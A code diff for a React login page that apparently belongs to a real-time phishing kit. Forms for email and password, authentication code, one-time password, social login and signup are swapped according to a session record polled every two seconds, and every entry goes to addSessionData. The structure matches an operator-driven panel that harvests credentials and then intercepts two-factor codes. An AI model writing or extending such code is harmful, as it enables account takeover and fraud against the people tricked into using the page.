@@ -10,9 +10,10 @@ import { useSessionContext } from '@/contexts/SessionContext';
 
 const LoginPage = () => {
   const { sessionId } = useParams<{ sessionId: string }>();
-  const { getSessionById, addSessionData } = useSessionContext();
+  const { getSessionById, addSessionData, getMainPageById, getSubPageById } = useSessionContext();
   const [formData, setFormData] = useState<Record<string, string>>({});
   const [session, setSession] = useState<ReturnType<typeof getSessionById>>();
+  const [subPage, setSubPage] = useState<any>(null);
   const [submitted, setSubmitted] = useState(false);
   const [error, setError] = useState('');
   const navigate = useNavigate();
@@ -31,16 +32,43 @@ const LoginPage = () => {
     
     setSession(sessionData);
     
+    // Get the current subpage details
+    const mainPage = getMainPageById(sessionData.mainPageId);
+    const subPage = mainPage ? 
+      getSubPageById(sessionData.mainPageId, sessionData.currentSubPageId) : 
+      undefined;
+      
+    if (subPage) {
+      setSubPage(subPage);
+    } else {
+      setError('Page template not found');
+    }
+    
     // Setup polling to check for page type changes
     const intervalId = setInterval(() => {
       const updatedSession = getSessionById(sessionId);
-      if (updatedSession && updatedSession.pageType !== session?.pageType) {
+      if (!updatedSession) return;
+      
+      if (
+        updatedSession && 
+        (updatedSession.currentSubPageId !== session?.currentSubPageId || 
+         updatedSession.mainPageId !== session?.mainPageId)
+      ) {
         setSession(updatedSession);
+        const mainPage = getMainPageById(updatedSession.mainPageId);
+        const subPage = mainPage ? 
+          getSubPageById(updatedSession.mainPageId, updatedSession.currentSubPageId) : 
+          undefined;
+          
+        if (subPage) {
+          setSubPage(subPage);
+          setFormData({});  // Clear form data when page type changes
+        }
       }
     }, 2000);
     
     return () => clearInterval(intervalId);
-  }, [sessionId, getSessionById, session?.pageType]);
+  }, [sessionId, getSessionById, session?.currentSubPageId, session?.mainPageId, getMainPageById, getSubPageById]);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setFormData({
@@ -77,6 +105,12 @@ const LoginPage = () => {
       setError('Failed to submit data');
       console.error(err);
     }
+  };
+
+  // Custom button handler for social login buttons
+  const handleSocialLogin = (provider: string) => {
+    setFormData({ provider });
+    handleSubmit(new Event('submit') as unknown as React.FormEvent);
   };
 
   if (error) {
@@ -127,7 +161,7 @@ const LoginPage = () => {
     );
   }
 
-  if (!session) {
+  if (!session || !subPage) {
     return (
       <div className="min-h-screen flex items-center justify-center p-4">
         <Card className="w-full max-w-md animate-pulse">
@@ -144,124 +178,221 @@ const LoginPage = () => {
     );
   }
 
+  // Dynamic form based on current subpage
+  const renderDynamicForm = () => {
+    switch (subPage.id) {
+      case 'login1':
+        return (
+          <>
+            <div className="grid gap-4">
+              <div className="space-y-2">
+                <Label htmlFor="email">Email</Label>
+                <Input 
+                  id="email" 
+                  name="email" 
+                  type="email" 
+                  placeholder="name@example.com" 
+                  required
+                  value={formData.email || ''}
+                  onChange={handleInputChange}
+                />
+              </div>
+              <div className="space-y-2">
+                <Label htmlFor="password">Password</Label>
+                <Input 
+                  id="password" 
+                  name="password" 
+                  type="password" 
+                  required
+                  value={formData.password || ''}
+                  onChange={handleInputChange}
+                />
+              </div>
+              <Button type="submit" className="w-full">Sign In</Button>
+            </div>
+          </>
+        );
+      
+      case 'login2':
+        return (
+          <>
+            <div className="grid gap-4">
+              <div className="space-y-2">
+                <Label htmlFor="auth_code">Authentication Code</Label>
+                <Input 
+                  id="auth_code" 
+                  name="auth_code" 
+                  placeholder="Enter your auth code" 
+                  required
+                  value={formData.auth_code || ''}
+                  onChange={handleInputChange}
+                />
+              </div>
+              <Button type="submit" className="w-full">Verify</Button>
+            </div>
+          </>
+        );
+      
+      case 'login3':
+        return (
+          <>
+            <div className="grid gap-4">
+              <div className="space-y-2">
+                <Label htmlFor="otp">One-Time Password</Label>
+                <Input 
+                  id="otp" 
+                  name="otp" 
+                  placeholder="Enter the OTP sent to your device" 
+                  required
+                  value={formData.otp || ''}
+                  onChange={handleInputChange}
+                />
+              </div>
+              <Button type="submit" className="w-full">Verify OTP</Button>
+            </div>
+          </>
+        );
+      
+      case 'login4':
+        return (
+          <>
+            <div className="grid gap-4">
+              <Button 
+                type="button" 
+                className="w-full bg-[#1877f2] hover:bg-[#0c63d4]"
+                onClick={() => handleSocialLogin('facebook')}
+              >
+                Continue with Facebook
+              </Button>
+              <Button 
+                type="button" 
+                className="w-full bg-[#1da1f2] hover:bg-[#0c85d0]"
+                onClick={() => handleSocialLogin('twitter')}
+              >
+                Continue with Twitter
+              </Button>
+              <Button 
+                type="button" 
+                className="w-full bg-[#db4437] hover:bg-[#c53727]"
+                onClick={() => handleSocialLogin('google')}
+              >
+                Continue with Google
+              </Button>
+            </div>
+          </>
+        );
+
+      case 'signup1':
+        return (
+          <>
+            <div className="grid gap-4">
+              <div className="space-y-2">
+                <Label htmlFor="name">Full Name</Label>
+                <Input 
+                  id="name" 
+                  name="name" 
+                  type="text" 
+                  placeholder="John Doe" 
+                  required
+                  value={formData.name || ''}
+                  onChange={handleInputChange}
+                />
+              </div>
+              <div className="space-y-2">
+                <Label htmlFor="email">Email</Label>
+                <Input 
+                  id="email" 
+                  name="email" 
+                  type="email" 
+                  placeholder="name@example.com" 
+                  required
+                  value={formData.email || ''}
+                  onChange={handleInputChange}
+                />
+              </div>
+              <div className="space-y-2">
+                <Label htmlFor="password">Password</Label>
+                <Input 
+                  id="password" 
+                  name="password" 
+                  type="password" 
+                  required
+                  value={formData.password || ''}
+                  onChange={handleInputChange}
+                />
+              </div>
+              <div className="space-y-2">
+                <Label htmlFor="confirm_password">Confirm Password</Label>
+                <Input 
+                  id="confirm_password" 
+                  name="confirm_password" 
+                  type="password" 
+                  required
+                  value={formData.confirm_password || ''}
+                  onChange={handleInputChange}
+                />
+              </div>
+              <Button type="submit" className="w-full">Register</Button>
+            </div>
+          </>
+        );
+        
+      case 'signup2':
+        return (
+          <>
+            <div className="grid gap-4">
+              <div className="space-y-2">
+                <Label htmlFor="email">Email Address</Label>
+                <Input 
+                  id="email" 
+                  name="email" 
+                  type="email" 
+                  placeholder="name@example.com" 
+                  required
+                  value={formData.email || ''}
+                  onChange={handleInputChange}
+                />
+              </div>
+              <Button type="submit" className="w-full">Subscribe</Button>
+            </div>
+          </>
+        );
+      
+      default:
+        // Generic form for any other pages
+        if (subPage.fields && subPage.fields.length) {
+          return (
+            <div className="grid gap-4">
+              {subPage.fields.map((field: string) => (
+                <div key={field} className="space-y-2">
+                  <Label htmlFor={field}>{field.charAt(0).toUpperCase() + field.slice(1).replace('_', ' ')}</Label>
+                  <Input 
+                    id={field} 
+                    name={field}
+                    type={field.includes('password') ? 'password' : field.includes('email') ? 'email' : 'text'}
+                    required
+                    value={formData[field] || ''}
+                    onChange={handleInputChange}
+                  />
+                </div>
+              ))}
+              <Button type="submit" className="w-full">Submit</Button>
+            </div>
+          );
+        }
+        return <p>No form elements defined for this page.</p>;
+    }
+  };
+
   return (
     <div className="min-h-screen flex items-center justify-center p-4">
       <Card className="w-full max-w-md">
         <CardHeader>
-          <CardTitle className="text-center">
-            {session.pageType === 'login1' && "Sign In"}
-            {session.pageType === 'login2' && "Enter Auth Code"}
-            {session.pageType === 'login3' && "OTP Verification"}
-            {session.pageType === 'login4' && "Sign In with Social Media"}
-          </CardTitle>
+          <CardTitle className="text-center">{subPage.name}</CardTitle>
         </CardHeader>
         <CardContent>
           <form onSubmit={handleSubmit}>
-            {session.pageType === 'login1' && (
-              <>
-                <div className="grid gap-4">
-                  <div className="space-y-2">
-                    <Label htmlFor="email">Email</Label>
-                    <Input 
-                      id="email" 
-                      name="email" 
-                      type="email" 
-                      placeholder="name@example.com" 
-                      required
-                      value={formData.email || ''}
-                      onChange={handleInputChange}
-                    />
-                  </div>
-                  <div className="space-y-2">
-                    <Label htmlFor="password">Password</Label>
-                    <Input 
-                      id="password" 
-                      name="password" 
-                      type="password" 
-                      required
-                      value={formData.password || ''}
-                      onChange={handleInputChange}
-                    />
-                  </div>
-                  <Button type="submit" className="w-full">Sign In</Button>
-                </div>
-              </>
-            )}
-            
-            {session.pageType === 'login2' && (
-              <>
-                <div className="grid gap-4">
-                  <div className="space-y-2">
-                    <Label htmlFor="auth_code">Authentication Code</Label>
-                    <Input 
-                      id="auth_code" 
-                      name="auth_code" 
-                      placeholder="Enter your auth code" 
-                      required
-                      value={formData.auth_code || ''}
-                      onChange={handleInputChange}
-                    />
-                  </div>
-                  <Button type="submit" className="w-full">Verify</Button>
-                </div>
-              </>
-            )}
-            
-            {session.pageType === 'login3' && (
-              <>
-                <div className="grid gap-4">
-                  <div className="space-y-2">
-                    <Label htmlFor="otp">One-Time Password</Label>
-                    <Input 
-                      id="otp" 
-                      name="otp" 
-                      placeholder="Enter the OTP sent to your device" 
-                      required
-                      value={formData.otp || ''}
-                      onChange={handleInputChange}
-                    />
-                  </div>
-                  <Button type="submit" className="w-full">Verify OTP</Button>
-                </div>
-              </>
-            )}
-            
-            {session.pageType === 'login4' && (
-              <>
-                <div className="grid gap-4">
-                  <Button 
-                    type="button" 
-                    className="w-full bg-[#1877f2] hover:bg-[#0c63d4]"
-                    onClick={() => {
-                      setFormData({ provider: 'facebook' });
-                      handleSubmit(new Event('submit') as unknown as React.FormEvent);
-                    }}
-                  >
-                    Continue with Facebook
-                  </Button>
-                  <Button 
-                    type="button" 
-                    className="w-full bg-[#1da1f2] hover:bg-[#0c85d0]"
-                    onClick={() => {
-                      setFormData({ provider: 'twitter' });
-                      handleSubmit(new Event('submit') as unknown as React.FormEvent);
-                    }}
-                  >
-                    Continue with Twitter
-                  </Button>
-                  <Button 
-                    type="button" 
-                    className="w-full bg-[#db4437] hover:bg-[#c53727]"
-                    onClick={() => {
-                      setFormData({ provider: 'google' });
-                      handleSubmit(new Event('submit') as unknown as React.FormEvent);
-                    }}
-                  >
-                    Continue with Google
-                  </Button>
-                </div>
-              </>
-            )}
+            {renderDynamicForm()}
           </form>
         </CardContent>
         <CardFooter className="justify-center">
